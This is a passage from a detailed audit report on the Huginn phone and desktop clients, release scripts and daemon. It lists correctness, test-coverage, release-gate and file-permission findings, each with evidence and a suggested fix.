openChat() launches `client.chat(id)` / `loadChatTranscript(id)` with no awaitReady(); grep shows awaitReady is called only at lines 187, 318, 905, 928, 943, 952 (refreshDelivery/refreshModels/refreshAll/startSessionsPolling/refreshSessions/refreshChats). HuginnClient.kt:183 always sends `header("Authorization", "Bearer ${tokenProvider().trim()}")` with no blank-token guard, so tokenNow=="" goes out as `Bearer ` → 401. loadChatTranscript's failure path sets `_chatError.value = errText(e)` ("Rejected by huginn: check the token in Settings") and nothing retries; attachIfRunning gets meta==null so a running chat is not re-followed. The VM's own doc block (lines 85-98) says 'Every public refresh waits on this' — these callers don't.
```

</details>

**Suggested fix:** awaitReady() at the top of openChat's coroutine (and in loadChatTranscript / retryChatTranscript), same as the other public entry points.

### `mobile/app/src/main/kotlin/com/silencelen/huginn/ui/SessionControls.kt:132`

Phone cannot change a chat's ask/act mode or reset model/effort to host default, though the daemon supports both and the desktop exposes both; the phone code even carries a now-false comment asserting mode is fixed at creation.

**lane** feature parity, phone vs desktop · **contract** C1 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner starts an Ask chat on the phone, mid-conversation needs Claude to actually edit a file. On desktop he'd flip the chip to Act; on the phone the chip is dead, so he must abandon the thread and re-create the chat as Act, losing the conversation context. Similarly, once a model override is set on phone there is no way back to 'host default' from that client.

<details><summary>Evidence</summary>

```
SessionControls.kt:97-99 doc: "A chat has no permission mode to cycle (its tool access is fixed by Ask/Act at creation)" and lines 132-136 render the mode as `AssistChip(onClick = { }, enabled = false, ...)`. But core HuginnClient.kt:563-568 `updateChat(id, model, effort, mode)` sends mode on PATCH, and desktop ChatOptionsRow.kt:74-79 offers an enabled ask/act picker (its doc: "the daemon accepts `mode` on PATCH"). Phone HuginnViewModel.kt:1512 `setChatOptions(id, model, effort)` simply omits the mode parameter. Desktop also offers `+ (CLEAR to "Host default")` on model/effort (ChatOptionsRow.kt:64,70); phone modelOptions/EFFORTS lists have no clear entry.
```

</details>

**Suggested fix:** Make ChatOptionsBar's mode chip a picker like desktop's, thread mode through vm.setChatOptions -> client.updateChat, and append the empty-string 'Host default' option to model/effort menus. Better per C1/task#20: replace both bars with one shared :ui composable parameterized by density.

### `mobile/app/src/main/kotlin/com/silencelen/huginn/ui/SessionScreen.kt:224`

The phone renders EVERY first-load transcript failure for a session as the 'No conversation yet' empty state — only a 409 means never-ran, so a network error or 500 on a months-old session reads as data loss (the exact masquerade class the desktop already fixed).

**lane** :ui shared composables — usability, state latches, and owner taste · **verdict** not separately verified

**What goes wrong:** Owner opens a busy session from the phone right as Tailscale blips; the first sessionTranscript read times out -> the screen shows 'No conversation yet' over a technical hint for up to 2.5s per retry (indefinitely if the route stays down), on a session with weeks of history. Conversely, if the network dies after load, the transcript freezes with no indication anything is failing.

<details><summary>Evidence</summary>

```
SessionScreen.kt:224-231: `error != null -> ... EmptyState("No conversation yet", error)` with a comment assuming the 409 case only. Feeding it, HuginnViewModel.kt:1186-1192 sets transcriptError for ANY failure while `_transcript.value == null` (`e.code == 409 -> e.message; else -> errText(e)`), so an SSE timeout or HTTP 500 lands under the same 'No conversation yet' headline with a raw error string as the hint. Contrast desktop SessionView.kt:376-386 which splits `neverRan` (its own controller flag) from `note != null` and never titles a read failure as absence. Secondary: once a page HAS loaded, phone poll failures are silently swallowed (onFailure only acts when transcript==null) — no equivalent of the desktop's 'transcript refresh failing:' banner (SessionView.kt:410-417), so a dead network shows a silently frozen transcript.
```

</details>

**Suggested fix:** Mirror the desktop: track neverRan (409) separately in HuginnViewModel; render non-409 first-load failures as 'Could not load this conversation' + retry (ChatScreen already does exactly this at line 138-151), and show a refresh-failing banner over a loaded page instead of swallowing poll errors.

### `mobile/app/src/main/kotlin/com/silencelen/huginn/ui/SessionScreen.kt:235`

The phone has no way to select or copy assistant prose at all — no SelectionContainer exists anywhere in :app and message text has no long-press affordance, while the desktop wraps both transcripts in SelectionContainer; only fenced code blocks (copy button) are copyable on the phone.

**lane** :ui shared composables — usability, state latches, and owner taste · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner reads an answer on the phone containing a hostname, an ID, or a paragraph to paste elsewhere -> long-press does nothing, there is no selection handle, and unless the text happens to be inside a ``` fence it cannot be copied from the device at all.

<details><summary>Evidence</summary>

```
`grep -rn "SelectionContainer|selectable" mobile/app/src/main` returns ZERO hits (ran it); phone transcript LazyColumns (SessionScreen.kt:235, ChatScreen.kt:165) render TranscriptRowItem bare, and :ui's UserBubble/AssistantBlock/ThinkingBlock use plain Text with no combinedClickable/onLongClick (grep over :ui also zero). Desktop: ChatView.kt:257 `else -> SelectionContainer {` and SessionView.kt:422 `SelectionContainer {`. The only phone copy path is MarkdownText's per-code-block button.
```

</details>

**Suggested fix:** Wrap the phone transcript LazyColumn content in SelectionContainer (as desktop does), or add a long-press 'Copy message' affordance on UserBubble/AssistantBlock routed through the existing onCopy. (Flag: may overlap one of the mobile audit's ~60 open med/low items — verify against that list before filing twice.)

### `mobile/app/src/main/kotlin/com/silencelen/huginn/ui/SessionScreen.kt:289`

The phone's private WorkStrip has diverged from the shared WorkSummary/WorkViews copy: it has no 3-minute linger and no 'just finished' state, so the strip (and the only path to agent conclusions) vanishes the instant a fan-out settles — the exact bug the shared code documents fixing.

**lane** KMP layering contract and shell-level duplication (C1) · **contract** C1 · **verdict** CONFIRMED (CONFIRMED:1)

**What goes wrong:** A 6-agent fan-out completes while the owner watches on the phone: the strip disappears on the same frame the last agent settles, the WorkSheet can no longer be opened, and the agents' summaries are unreadable from the phone — while the desktop shows 'just finished' plus the conclusions for 3 more minutes. Same daemon, two different behaviors.

<details><summary>Evidence</summary>

```
Phone SessionScreen.kt:289 gates the strip with `if (working || bgWork) { WorkStrip(...) }` and its private WorkStrip headline has no `live` branch (falls to "working"). Shared :core WorkSummary.kt declares `const val LINGER_MS: Long = 3 * 60 * 1000L`, `fun visible(working, bgWork, lastWorkAtMs, nowMs)` and a `live` param whose comment reads "The LINGERING strip... Saying 'working' here is the one thing it must not do"; desktop WorkPanel.kt:124-171 tracks `lastWorkAt`, ticks a clock, and passes `live = working || bgWork` so it shows 'just finished' with a SettledDot for 3 minutes. WorkSummary's own doc calls the no-linger behavior 'a real miss'.
```

</details>

**Suggested fix:** Delete the phone's private WorkStrip/WorkSheet (SessionScreen.kt:432-701) and render the shared work.WorkStrip/WorkDetail driven by WorkSummary.visible/strip; the phone needs the same lastWorkAt+ticker state the desktop keeps in WorkPanel.kt (consider moving that ticker into :ui so it isn't written a second time).

### `mobile/app/src/main/kotlin/com/silencelen/huginn/ui/SessionScreen.kt:550`

The WorkSheet's agents poll is scoped to composition (DisposableEffect), not lifecycle, so backgrounding the app with the sheet open leaves a 3-second poll against the daemon running indefinitely.

**lane** :app (Android shell) — correctness, lifecycle, notifications · **contract** C6 · **verdict** not separately verified

**What goes wrong:** Owner opens the work sheet to watch a fan-out, presses home and pockets the phone; with the WatchService foreground service keeping the process alive, the app hits GET /v1/sessions/:name/agents every 3s all night — the exact 'reading two dozen transcript tails every three seconds' cost the sheet's own comment says is only worth paying 'while somebody is actually looking'.

<details><summary>Evidence</summary>

```
WorkSheet: `DisposableEffect(name) { onOpen(); onDispose { onClose() } }` → vm.startAgentsPolling (HuginnViewModel.kt:1332: `while (isActive) { client.sessionAgents(name); delay(3000) }` in viewModelScope). Backgrounding fires ON_STOP but does NOT dispose composition, and the enclosing sessionDetail LifecycleStartEffect (MainActivity.kt:824-830) stops only screen/transcript polling — agentsJob is not in its onStopOrDispose. `showWork` is rememberSaveable so the sheet stays composed.
```

</details>

**Suggested fix:** Cancel agents polling in sessionDetail's LifecycleStartEffect onStopOrDispose (alongside stopScreenPolling), or drive the sheet's poll from a LifecycleStartEffect.

### `mobile/app/src/test/resources/sessions.json:1`

ApiContractTest's fixtures were captured from daemon 2.0.0 on 2026-07-27 and have drifted from the live 2.52.2 daemon: 10 wire fields the clients render are absent from the fixtures, and one field in the fixtures no longer exists, so the only automated app/daemon wire check cannot catch a rename of any of them.

**lane** test coverage map — find the next TermKeys · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** The daemon renames `chats[].pending` to `chats[].queued`. `pending` is what drives the phone's and desktop's "message waiting" state on the chat list. Kotlin decodes it as the default (false) because ignoreUnknownKeys swallows the new name, and ApiContractTest passes 49/49 because its chats.json fixture has no `pending` key at all to assert on. The owner's queued messages stop showing as queued on both clients and nothing goes red.

<details><summary>Evidence</summary>

```
ApiContractTest.kt:17-24 states the fixtures were "captured from the live daemon on 2026-07-27" and that "This is the only automated check that the app and the daemon still agree on the wire format. A renamed server field is otherwise invisible". Deployed daemon is 2.52.2 (huginn-appd.js:51).
RAN (read-only GET against the live daemon with the deploy token, key-set diff in python):
  /v1/sessions  MISSING FROM FIXTURE: ['bgAgents','bgShells','bgTask','panePid','sessionActivityAt']
                FIXTURE-ONLY (no longer emitted): ['permissionMode']
  /v1/chats     MISSING FROM FIXTURE: ['effort','finishedAt','finishedRuns','model','pending']
  /v1/status    no drift
The decoder is `Json { ignoreUnknownKeys = true; explicitNulls = false }` (ApiContractTest.kt:27), so an added or renamed field never throws — absence from the fixture is total blindness, not a soft warning.
```

</details>

**Suggested fix:** Re-capture and scrub all five fixtures from 2.52.2, then add positive assertions for each newly-present field the UI reads (`model`, `effort`, `pending`, `finishedAt`, `bgAgents`, `bgTask`, `sessionActivityAt` — the last being the C9 'sort by window_activity, not session_activity' pair). Decide `permissionMode` explicitly: keep it and add a daemon-side emitter, or drop it from Models.kt:53/164. Add a dated re-capture note so staleness is visible.

### `mobile/core/src/commonMain/kotlin/com/silencelen/huginn/data/HuginnClient.kt:622`

sendMessage's SSE reader treats the daemon's 202-queued JSON reply as a broken event stream, so a send that races a busy chat surfaces as the failure 'stream ended mid-frame' even though the message was accepted and queued.

**lane** :core — HuginnClient.kt, HTTP/SSE, reattach, timeouts, models · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Run 1 finishes and the daemon instantly drains a queued message into run 2; the user hits send in the seconds before the client's next refresh notices (local _sending/_running still false) -> client POSTs with stream=1 -> 202 queued -> user sees an error toast 'stream ended mid-frame' for a message that was accepted; if they retype and resend, the message is delivered twice. Same window exists whenever another surface (desktop, phone, CLI) starts a run between refreshes.

<details><summary>Evidence</summary>

```
Client: sse() gates only on `if (!resp.status.isSuccess())` then hands the body to SseLines (202 is 2xx). Daemon busy path (huginn-appd.js:3001) answers POST /messages?stream=1 with `sendJson(res, 202, { ok: true, queued: true, position: q.position })` and sendJson (line 160) does `res.end(body)` with no trailing newline. Demonstrated live on a scratch appd 2.52.2 (port 18787, fake claude shim keeping a run active): second send with ?stream=1 returned `HTTP/1.1 202 Accepted`, `Content-Type: application/json`, 38-byte body ending `..."position":1}` (xxd: last byte 0x7d, no \n). SseLines on a newline-less body throws SseTruncatedException (pinned by SseLinesTest 'a body that ends mid-line is a truncation'), which sse() catches and emits `ChatEvent.Failure("stream ended mid-frame")` — toasted by the phone (HuginnViewModel collect Failure branch) and shown as _notice on desktop.
```

</details>

**Suggested fix:** In sse(), before constructing SseLines, branch on the response Content-Type: if application/json (or status 202), decode the body and emit a dedicated ChatEvent (e.g. Queued(position)) instead of parsing it as SSE; collectors then show 'queued' and reattach — mirroring the explicit queueMessage path. Alternatively have the daemon answer busy stream=1 sends with an SSE `event: queued` frame plus `done`.

### `mobile/core/src/commonMain/kotlin/com/silencelen/huginn/ui/LiveInput.kt:46`

LiveInput.merge coalesces named keys with no 32-key request cap, so a merged live-typing burst >32 keys is refused whole by the daemon and every keystroke in the batch is lost.

**lane** protocol contract drift — what clients SEND vs what appd ACCEPTS · **contract** C1 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** In Live mode on the Compose desktop (or a hardware keyboard on the fold), hold an auto-repeating key (~30Hz Backspace/arrow) across a network stall of ~1s+ (wifi roam, mesh hiccup): the next drain merges >32 repeats into one request, the daemon 400s, all of them are dropped — held Backspace deletes nothing and an error banner appears.

<details><summary>Evidence</summary>

```
merge(): `out[out.size - 1] = Op.Key(last.keys + op.keys)` — unbounded fusion; both drainers send the fused list as one request (HuginnViewModel.kt:1372 `client.sendKeys(target, keys = m.keys)`, SessionController.kt:459-463). Server huginn-appd.js:2709: `if (body.keys.length > 32) return sendErr(res, 400, 'too many keys')` — rejection precedes delivery of ANY key. Electron's shared core has the cap and chunker precisely because 'one bad key would 400 the entire request' (liveInput.ts:67 MAX_KEYS_PER_REQUEST=32, toWire slices at 32); the Kotlin :core copy that replaced it lost the rule — shared-logic drift. RAN IT: POST 33×"Up" to live daemon → {"error":"too many keys"}; 32 succeeds.
```

</details>

**Suggested fix:** Chunk Op.Key lists at 32 per request in the drainer or in merge (mirror Electron's toWire), keeping order.

### `mobile/core/src/commonMain/kotlin/com/silencelen/huginn/ui/ModelLabels.kt:1`

ModelLabels — pure, shared by both clients, and duplicated verbatim in :app — has zero tests anywhere in the repo, despite its own docstring recording a regression it exists to prevent.

**lane** test coverage map — find the next TermKeys · **contract** C1 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Someone 'tidies' the phone copy of prettyModel to collapse a version suffix (`m.substringBefore(' ')`) so the chip fits on a narrow screen. The phone's model chip reads "Opus" for both Opus 5 and Opus 4.8 — the exact regression the :core docstring describes — while the desktop, reading ModelLabels.model, still shows the version. 477 Kotlin tests stay green in both modules, because neither symbol is named by any test.

<details><summary>Evidence</summary>

```
RAN across every test source in mobile/: `prettyModel` 0 mentions, `prettyEffort` 0, `modelOptions` 0, `FALLBACK_MODELS` 0, `ModelLabels` 0. The shared copy (core/ui/ModelLabels.kt:30-38) documents the past break:
  * The phone's did once, which is why the control said "Opus"
  * when the difference between Opus 5 and Opus 4.8 is the whole question.
The :app duplicate is still live and independently untested — app/ui/SessionControls.kt:44 `private val FALLBACK_MODELS`, :176 `fun prettyEffort`, :179 `fun modelOptions`, :190 `fun prettyModel` — the C1 "task #20" shadow set. Both copies are total functions over strings with no Compose or Android dependency: a test costs ten lines.
```

</details>

**Suggested fix:** Add core/src/commonTest/.../ModelLabelsTest.kt asserting the properties, not the strings: model("Opus 5") preserves the version; model(null)/model("  ") == "Model"; effort("xhigh") == "Xhigh"; options(emptyList()) == FALLBACK_MODELS and options(nonEmpty) ignores the fallback. Then delete the :app copies (task #20) so there is one thing to test.

### `mobile/scripts/release-desktop.sh:91`

The "never overwrite what is already live" gate fails OPEN: any curl/auth/parse failure yields an empty LIVE and the release proceeds.

**lane** packaging and release — mobile/scripts/{build,ship,release-desktop}.sh, app-desktop/packaging/huginn-desktop-kt.nsi, app-desktop/build.gradle.kts (packaging config), desktop/scripts/release.sh + electron-builder.yml · **contract** C3 · **verdict** not separately verified

**What goes wrong:** huginn-appd is restarted (or the tailnet route is briefly down, or /etc/huginn-appd/token was rotated and the running daemon has the new one) at the moment a release is started for a version that is already live. LIVE comes back empty, the gate is a no-op, and the script rebuilds and republishes the same version number with different bytes and a different sha256. A Compose client that had already downloaded and parked that version finds its cached file's hash no longer matches the manifest and silently re-downloads ~92-96 MB; the "same version, same hash claim, different bytes" invariant the comment at line 89-90 exists to protect is gone, with no operator-visible warning.

<details><summary>Evidence</summary>

```
```
if [ -f "$TOKEN_FILE" ]; then
  LIVE=$(curl -sf -H "Authorization: Bearer $(cat "$TOKEN_FILE")" \
    "$BASE_URL$FEED/manifest" 2>/dev/null | node -p \
    "try{JSON.parse(require('fs').readFileSync(0,'utf8')).version}catch{''}" || true)
  if [ "$LIVE" = "$VERSION" ]; then
```
Three independent fail-open paths: the whole block is skipped when $TOKEN_FILE is absent; `curl -sf` errors are swallowed by `2>/dev/null` and `|| true`; the node one-liner catches every parse error and prints ''. `[ "" = "0.3.1" ]` is false, so the script continues. The parallel Electron gate (desktop/scripts/release.sh:36-43) has the identical shape.
```

</details>

**Suggested fix:** Distinguish "the feed says X" from "the feed could not be read". If the manifest fetch fails for any reason other than a 404 on a never-stocked channel, REFUSE and make the operator pass an explicit --force-unverified flag. Same change in desktop/scripts/release.sh.

### `mobile/scripts/release-desktop.sh:116`

Both test-count floors are badly stale — the desktop release gate demands 436 tests where 710 actually run, and mobile/scripts/build.sh demands 432 where 522 run — so each gate would now pass with a whole module's suite silently gone.

**lane** documentation drift and deployed-state drift · **contract** C11 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** A renamed source set or a module split drops :core's entire android target (233 tests). The per-directory `-gt 0` guard still passes because the directory has some XML, the total lands at 477, and both gates report green — 477 >= 436 and, for a build.sh run, 289 would still be caught but a smaller loss (say :app's 49 plus :ui's 7) would not. The exact failure both scripts were hardened against twice now reaches an APK and a signed desktop installer.

<details><summary>Evidence</summary>

```
mobile/scripts/release-desktop.sh:116 `KOTLIN_MIN=436   # 382 (scripts/build.sh floor) + 54 (:app-desktop), 2026-07-31` — but mobile/scripts/build.sh:59 now reads `KOTLIN_MIN=432`, not 382, and :app-desktop is not 54.
Actual counts read straight out of the existing JUnit XML with the scripts' own expression:
```
core/build/test-results/jvmTest = 233
core/build/test-results/testDebugUnitTest = 233
app/build/test-results/testDebugUnitTest = 49
ui/build/test-results/jvmTest = 7
app-desktop/build/test-results/test = 188
```
233+233+49+7 = 522 vs build.sh's floor of 432 (90 of slack). Plus 188 = 710 vs release-desktop.sh's floor of 436 (274 of slack). build.sh:39-44 states the intent explicitly: "A floor catches that; it only ever needs raising, never lowering, unless tests are deliberately deleted."
```

</details>

**Suggested fix:** Raise `KOTLIN_MIN` to the current real totals (build.sh -> ~522, release-desktop.sh -> ~710) and correct release-desktop.sh's comment, which still cites a floor value (382) and an :app-desktop count (54) that no longer exist.

### `mobile/scripts/release-desktop.sh:116`

Both test-count floors are badly stale (436 and 432 against 710 actual), so a partial loss of ~274 Kotlin tests would publish green; the release script's floor is also arithmetically wrong about the number it claims to be derived from.

**lane** packaging and release — mobile/scripts/{build,ship,release-desktop}.sh, app-desktop/packaging/huginn-desktop-kt.nsi, app-desktop/build.gradle.kts (packaging config), desktop/scripts/release.sh + electron-builder.yml · **contract** C11 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** A source-set or Gradle-plugin change makes :core's Android target discover only its 5 fastest test classes (e.g. a testDebugUnitTest include filter, an androidTest/unitTest split, a KMP source-set rename). The per-dir zero check passes because 5 > 0, the total is 482 >= 436, both build.sh and release-desktop.sh print "kotlin tests: 482 passed", and a desktop release plus an APK ship out with 228 shared-code tests silently not running — including the pane-size lease and reattach safety properties the comments say are asserted there.

<details><summary>Evidence</summary>

```
release-desktop.sh:116 `KOTLIN_MIN=436   # 382 (scripts/build.sh floor) + 54 (:app-desktop), 2026-07-31` — but scripts/build.sh:59 says `KOTLIN_MIN=432`, not 382, and :app-desktop now has 188 tests, not 54.
RAN the gate's own counting loop over the on-disk results:
  core/build/test-results/jvmTest = 233
  core/build/test-results/testDebugUnitTest = 233
  app/build/test-results/testDebugUnitTest = 49
  ui/build/test-results/jvmTest = 7
  app-desktop/build/test-results/test = 188
  TOTAL=710   release-desktop.sh KOTLIN_MIN=436   build.sh KOTLIN_MIN=432
The per-directory `-gt 0` check catches a module going to ZERO, but nothing catches partial loss: 233+5+49+7+188 = 482 >= 436 still passes.
Related, same class: build.sh:96 asserts only `NODE_COUNT -gt 0` for the appd suite (release-desktop.sh:139 uses >=300 against 385 real `test()` calls), so the APK ship path accepts a server suite that ran one test.
```

</details>

**Suggested fix:** Recompute both floors from the current 710 (build.sh: 522 for its four dirs; release-desktop.sh: 710) and add a PER-DIRECTORY floor rather than one aggregate, so a partial loss in one module cannot be masked by another module's count. Give the node gate in build.sh the same >=N floor release-desktop.sh already uses. Add a comment rule that the floor is bumped in the same commit as any test addition.

### `mobile/scripts/release-desktop.sh:311`

A --linux-only Compose release publishes a bumped manifest with no windows-x64 artifact, which puts every Windows Compose client into a permanent UpdateState.Error with an endless retry loop.

**lane** packaging and release — mobile/scripts/{build,ship,release-desktop}.sh, app-desktop/packaging/huginn-desktop-kt.nsi, app-desktop/build.gradle.kts (packaging config), desktop/scripts/release.sh + electron-builder.yml · **verdict** not separately verified

**What goes wrong:** A Linux-only fix is released as 0.3.3 with --linux-only. The owner's Windows Compose client wakes up, sees 0.3.3 > 0.3.2, finds no windows-x64 key, and Settings shows "release 0.3.3 has no windows-x64 build" — not "up to date" — permanently, while re-checking every 30 minutes and writing a diagnostics line each time. It never recovers on its own; only a full (non-linux-only) release clears it.

<details><summary>Evidence</summary>

```
release-desktop.sh:311 `if (linuxOnly !== '1') man.artifacts['windows-x64'] = entry(exe)` — the version is bumped but the windows key is simply omitted; nothing in step 4's validation (line 319-324) requires it, and step 7 only checks artifacts present in $DIST.
DesktopUpdater.kt:165-169:
```
if (!Semver.isNewer(manifest.version, currentVersion)) { return settle(UpdateState.UpToDate(currentVersion)) }
val artifact = manifest.artifactFor(plat)
    ?: return fail("release ${manifest.version} has no $plat build")
```
and DesktopUpdater.kt:102-104 turns that Error into a retry ladder: `waitOrTokenChange(backoff); backoff = (backoff * 2).coerceAtMost(RETRY_MAX_MS)` (30s doubling to 30min, forever).
Note the Electron channel does NOT have this failure shape — it leaves latest.yml alone — so the two channels behave differently under the same flag.
```

</details>

**Suggested fix:** Either (a) carry the previous release's windows-x64 entry forward verbatim in the manifest when --linux-only is used (the exe is still in the channel dir and its sha256 is in the old manifest), or (b) make --linux-only refuse to bump the published manifest version at all and stage under a separate pre-release marker. Add a gate that a manifest bump must not remove a platform key that the previous manifest had.

### `mobile/ui/src/commonMain/kotlin/com/silencelen/huginn/ui/theme/Theme.kt:38`

Color roles the UI actually uses are not defined in the custom schemes and fall back to M3's baseline purple/pink — most visibly `tertiary`, which paints workflow ids in AgentCard (shared, both clients) baseline-pink 0xFFEFB8C8 inside a palette whose own comment declares rune-gold 'huginn's one accent'.

**lane** :ui shared composables — usability, state latches, and owner taste · **verdict** not separately verified

**What goes wrong:** Any fan-out with a workflow id shows baseline-M3 pink monospace text on both clients' agent cards; ticking a checkbox in a phone multi-select prompt highlights the row baseline purple-grey; hovering a right-click menu row uses a cool grey against warm chrome — the off-palette baseline colors are precisely the 'generated interface' tell the house rules exist to avoid, and on the phone in light mode chat bubbles/state marks take the stock purple theme.

<details><summary>Evidence</summary>

```
DarkColors (Theme.kt:38-57) sets neither `tertiary`, `secondaryContainer`, nor `surfaceContainerHighest`; darkColorScheme() defaults them to the M3 baseline (tertiary=0xFFEFB8C8 pink, secondaryContainer=0xFF4A4458 purple-grey, surfaceContainerHighest cool near-purple) against the declared warm set (Bg 0xFF12100F, Accent 0xFFC8A45C 'rune-gold: huginn's one accent'). Users: shared :ui WorkViews.kt:217 (`color = MaterialTheme.colorScheme.tertiary` on every workflow-tagged agent row — phone AND desktop), phone ChatsScreen.kt:162/207/214, SessionScreen.kt:664, TerminalScreen.kt:400 (`secondaryContainer` = checked multi-select row), desktop Menus.kt:176 + CommandPalette.kt:147 (`surfaceContainerHighest` hover/active). LightColors (Theme.kt:59-70) additionally omits secondary/tertiary/all surfaceContainer* despite the header claiming 'light is fully styled'.
```

</details>

**Suggested fix:** Define tertiary/onTertiary, secondaryContainer/onSecondaryContainer and surfaceContainerHighest (and the light-scheme equivalents) explicitly in Theme.kt from the warm palette; grep for other colorScheme roles referenced but unset as a gate.

### `server/appd/deploy.sh:9`

deploy.sh's only pre-flight gate is `node --check` on huginn-appd.js; it never syntax-checks lib/*.js, so a broken library module is installed and the daemon restarted before anything notices.

**lane** CLI client + server glue + provisioning (never audited) · **contract** C11 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** A session edits server/appd/lib/pane.js and leaves an unbalanced paren, then runs deploy.sh. `node --check huginn-appd.js` returns 0, the broken pane.js is installed into /opt/huginn-appd/lib/, `systemctl restart huginn-appd` runs, node throws at require time, Restart=on-failure/RestartSec=3 crash-loops it forever, and the phone/desktop clients go dark. The gate that existed specifically to prevent this did not fire.

<details><summary>Evidence</summary>

```
deploy.sh:9-13:
  node --check "$SRC/huginn-appd.js"
  install -d "$DEST/lib"
  install -m 0644 "$SRC/huginn-appd.js" "$DEST/huginn-appd.js"
  install -m 0644 "$SRC"/lib/*.js "$DEST/lib/"
  systemctl restart huginn-appd
RAN (repro): copied huginn-appd.js + lib/pane.js to a scratch dir and appended `this is a syntax error (((` to lib/pane.js:
  node --check scratch/huginn-appd.js      -> EXIT_MAIN=0   (gate PASSES)
  node --check scratch/lib/pane.js         -> EXIT_LIB=1   SyntaxError at pane.js:486
huginn-appd.js:32 `const { readTranscript, liveActivity } = require('./lib/transcript');` — lib modules are require()d at startup, so a syntax error there is a hard crash on boot, not a lazy failure.
```

</details>

**Suggested fix:** `node --check "$SRC/huginn-appd.js"` then `for f in "$SRC"/lib/*.js; do node --check "$f"; done` (or `node -e "require('$SRC/huginn-appd.js')"` in a dry-run mode) BEFORE the install/restart.

### `server/appd/deploy.sh:16`

deploy.sh's post-restart health check hardcodes huginn's tailnet IP and runs inside a command substitution under `set -e`, so a connection failure aborts the script silently — the "daemon did not come back healthy" message on the next line is unreachable for the failure it was written for.

**lane** CLI client + server glue + provisioning (never audited) · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Tailscale renumbers huginn (e.g. after a node re-add following the 2026-07-21 API-key rotation) or someone deploys on a second host. deploy.sh restarts a perfectly healthy daemon, curl fails with exit 7, `set -e` kills the script at line 16, and the operator sees bare exit 7 with zero output — no "[deploy]" line at all — and cannot tell whether the daemon is up, down, or serving the old code. The 'prove it came back up' guarantee in the file's own header comment is silently absent.

<details><summary>Evidence</summary>

```
deploy.sh:5 `set -euo pipefail`
deploy.sh:15-18:
  TOKEN="$(cat /etc/huginn-appd/token)"
  PING="$(curl -sf -H "Authorization: Bearer $TOKEN" http://100.97.198.90:8787/v1/ping)"
  echo "[deploy] $PING"
  grep -q '"ok":true' <<<"$PING" || { echo "[deploy] daemon did not come back healthy" >&2; exit 1; }
RAN (repro):
  bash -c 'set -euo pipefail; PING="$(curl -sf --max-time 2 http://127.0.0.1:9/nope)"; grep -q ok <<<"$PING" || { echo "[deploy] daemon did not come back healthy" >&2; exit 1; }; echo NEVER'
  -> EXIT=7  OUTPUT=[]   (curl's exit 7 propagates; neither the diagnostic nor `echo NEVER` runs)
The address 100.97.198.90 is huginn's own Tailscale IP, so the script is not usable on any other host and breaks if huginn is re-added to the tailnet with a new address.
```

</details>

**Suggested fix:** Derive the address (`tailscale ip -4` or 127.0.0.1) instead of hardcoding, and run the probe outside command substitution: `PING=$(curl -sf ... ) || { echo '[deploy] health probe unreachable' >&2; exit 1; }`.

### `server/appd/huginn-appd.js:656`

saveMeta is the only JSON state writer in the daemon that is not atomic (plain writeFileSync with O_TRUNC, no tmp+rename), and a torn meta.json makes the chat silently vanish and become undeletable via the API.

**lane** appd async ordering, state persistence, and concurrency · **contract** C10 · **verdict** CONFIRMED (CONFIRMED:2) · **demonstrated by running it**

**What goes wrong:** Host power loss or daemon SIGKILL lands between the O_TRUNC open and the write during any of the several per-run meta rewrites -> meta.json is empty/half-written -> on restart the chat (history reference, claudeSessionId, queued messages) disappears from every list and route, reconcileInterruptedRuns skips it, and the owner cannot even delete the ghost through the app; messages.jsonl is orphaned on disk.

<details><summary>Evidence</summary>

```
Line 656: `fs.writeFileSync(metaPath(meta.id), JSON.stringify(rest, null, 2));` while every sibling state file uses tmp+rename (clients 1447-1448, alerts 1480-1481, push 1515-1516, autoswitch 1669-1670, accounts.js _write 194-196). loadMeta 643-645: `catch { return null; }`. Demonstrated on a scratch daemon (port 18787, scratch data dir): truncated a chat's meta.json to half → `GET /v1/chats` returned `{"chats": []}`, `GET /v1/chats/<id>` → 404, `DELETE /v1/chats/<id>` → 404 `{"error":"no such chat"}` with the directory still on disk. meta.json is rewritten ~6+ times per run (startRun 808/826, init 927, result 969, close 883/889).
```

</details>

**Verifier's correction:** None to the claim. One qualification for severity calibration: the trigger is a crash-consistency window (SIGKILL/OOM between O_TRUNC and write, or ext4 writeback loss after power cut), not something an API caller can force, and the blast radius is one chat — messages.jsonl survives and is recoverable by hand. That keeps it MED rather than higher, and the fix is the same tmp+rename the other seven writers already use.

**Suggested fix:** Route saveMeta through the same tmp+rename funnel as the other state files: write `${metaPath}.tmp` then fs.renameSync onto metaPath.

### `server/appd/huginn-appd.js:656`

Chat transcripts are written world-readable (0644) inside world-listable directories (0755); the only thing containing them on the live host is a 0700 on the data dir that no code or script creates, so any rebuild, restore, or HUGINN_APPD_DATA change silently exposes every conversation.

**lane** appd secrets hygiene, credential handling, and host hardening · **contract** C10 · **verdict** CONFIRMED (CONFIRMED:2) · **demonstrated by running it**

**What goes wrong:** The daemon is restored from backup onto a rebuilt LXC, or moved to a new host, or pointed at a fresh HUGINN_APPD_DATA. `/var/lib/huginn-appd` is then created by the daemon itself at 0755 (demonstrated above), and every `chats/<uuid>/messages.jsonl` — the full text of every phone conversation the owner has had with Claude, including whatever files, hostnames, and credentials were discussed in them — is readable by any uid on the box. Nothing warns, nothing differs visibly, and the protection that exists today came from a one-off manual chmod that no script will reproduce.

<details><summary>Evidence</summary>

```
